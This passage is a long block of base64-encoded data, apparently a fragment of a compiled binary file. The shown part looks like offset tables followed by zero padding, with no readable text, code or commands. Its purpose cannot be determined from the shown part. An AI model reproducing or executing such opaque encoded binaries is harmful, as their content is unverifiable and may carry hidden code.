WsNbQ1vDXENcw11DXcNeQ17DX0Nfw1BDYMNhQ2HDYkNiw2NDY8NkQ2TDZUNlw2ZDZsNnQ2fDYQPxQ/GD8cPyA/JD8oPyw/MD80Pzg/PD9AP0Q/SD9MP1A/VD9YP1w/YD9kP2g/bD9wP3Q/eD98P4A/hD+IP5w/oD+kP6g/rD+wP7Q/uD+8P8A/xD/sP/A/9D8AAADQAACEAAAADDAQMMw41DjcOOQ47Dj0OPw4BDkMORQ5HDkkOSw5NDk8OUQ5TDlUOVw5ZDlsOXQ5fDk8PkA+RD5IPlw+YD5kPmg+HD8kPyw/ND88P0Q/TD9UP1w/ZD9sP3Q/fD+EP4w/lD+cP6Q/rD+0P7w/xD/MP9Q/3D/kP+w/9D/8PwDgAABgAwAABDAMMBQwHDAkMCwwNDA8MEQwTDBUMFwwZDBsMHQwfDCEMIwwlDCcMKQwrDC0MLwwxDDMMNQw3DDkMOww9DD8MAQxDDEUMRwxJDEsMTQxPDFEMUwxVDFcMWQxbDF0MXwxhDGMMZQxnDGkMawxtDG8McQxzDHUMdwx5DHsMfQx/DEEMgwyFDIcMiQyLDI0MjwyRDJMMlQyXDJkMmwydDJ8MoQyjDKUMpwypDKsMrQyvDLEMswy1DLcMuQy7DL0MvwyBDMMMxQzHDMkMywzNDM8M0QzTDNUM1wzZDNsM3QzfDOEM4wzlDOcM6QzrDO0M7wzxDPMM9Qz3DPkM+wz9DP8MwQ0DDQUNBw0JDQsNDQ0PDRENEw0VDRcNGQ0bDR0NHw0hDSMNJQ0nDSkNKw0tDS8NMQ0zDTUNNw05DTsNPQ0/DQENQw1FDUcNSQ1LDU0NTw1RDVMNVQ1XDVkNWw1dDV8NYQ1jDWUNZw1pDWsNbQ1vDXENcw11DXcNeQ17DX0Nfw1BDYMNhQ2HDYkNiw2NDY4NkA2SDZQNlg2YDZoNnA2eDaANog2kDaYNqA2qDawNrg2wDbINtA22DbgNug28Db4NgA3CDcQNxg3IDcoNzA3ODdAN0g3UDdYN2A3aDdwN3g3gDeIN5A3mDegN6g3sDe4N8A3yDfQN9g34DfoN/A3+DcAOAg4EDgYOCA4KDgwODg4QDhIOFA4WDhgOGg4cDh4OIA4iDiQOJg4oDioOLA4uDjAOMg40DjYOOA46DjwOPg4ADkIORA5GDkgOSg5MDk4OUA5SDlQOVg5YDloOXA5eDmAOYg5kDmYOaA5qDmwObg5wDnIOdA52DngOeg58Dn4OQA6CDoQOhg6IDooOjA6ODpAOkg6UDpYOmA6aDpwOng6gDqIOpA6mDqgOqg6sDq4OsA6yDrQOtg64DroOvA6+DoAOwg7EDsYOyA7KDswOzg7QDtIO1A7WDtgO2g7cDt4O4A7iDuQO5g7oDuoO7A7uDvAO8g70DvYO+A76DvwO/g7ADwIPBA8GDwgPCg8MDw4PEA8SDxQPFg8YDxoPHA8eDyAPIg8kDyYPKA8qDywPLg8wDzIPNA82DzgPOg88Dz4PAA9CD0QPRg9ID0oPTA9OD1APUg9UD0AAADwAAA4AAAAoD+kP6g/rD+wP7Q/uD+8P8A/xD/IP8w/0D/UP9g/3D/gP+Q/6D/sP/A/9D/4P/w/AAABAJwAAAAAMAQwCDAMMBAwFDAYMBwwIDAkMCgwLDAwMDQwODA8MEAwRDBIMEwwUDBUMFgwXDBgMGQwaDBsMHAwdDB4MHwwgDCEMIgwjDCQMJQwmDCcMKAwpDCoMKwwsDC0MLgwvDDAMMQwyDDMMNAw1DDYMNww4DDkMOgw7DDwMPQw+DD8MAAxBDEIMQwxEDEUMRgxHDEgMSQxABABAFABAAAENgg2mDawNsA2xDbYNtw27DbwNvQ2/DYUNyQ3KDc4Nzw3QDdIN2A3cDd0N4Q3iDeMN5A3mDewN8A3xDfUN9g33DfgN+g3ADgQOBQ4JDgoODA4SDhYOFw4bDhwOIA4hDiIOJA4qDi4OLw41DjkOOg47DjwOAQ5CDkMOSQ5KDlAOVA5VDlkOWg5bDl0OYw5nDmsObA5tDm4Ocw50DnUOdg5FDocOiQ6KDowOkQ6TDpgOmg6fDqEOow6lDqYOpw6pDq4OsA6yDrQOtQ62DrgOvQ6EDswO0w7UDtwO5A7sDu8O9g75DsAPBw8IDw8PEA8YDxoPGw8iDyQPJQ8rDywPMw80DzgPAQ9ED0YPUQ9SD1QPVg9YD1kPWw9gD2gPbw9wD3gPQA+ID5APmA+gD6gPqw+yD7oPgg/KD9IP2g/dD98P8A/1D/kP/Q/ADABADQBAAAAMBwwODBYMHgwoDDgMOQwsDLwM/Qz+DP8MwA0BDQINAw0EDQUNBg0QDlIOcg7zDvQO9Q72DvcO+A75DvoO+w78Dv0O/g7/DsAPAQ8CDwMPBA8FDwYPBw8IDwkPCg8LDwwPDQ8ODw8PEA8RDxIPEw8UDxUPFg8XDxgPGQ8aDxsPHA8fDyAPIQ8iDyMPJA8lDyYPJw8oDykPKg8rDywPLQ8uDy8PMA8xDzIPMw80DzUPNg83DzgPOQ86DzsPPA89Dz4PPw8AD0EPQg9DD0QPRQ9GD0cPSA9JD0oPSw9VD1kPXQ9hD2UPbQ9wD3EPcg9zD0APgg+DD4QPhQ+GD4cPiA+JD4oPiw+OD48PkA+RD5IPkw+UD5UPlw+YD5oPnA+nD7IPuw+GD8cPyA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA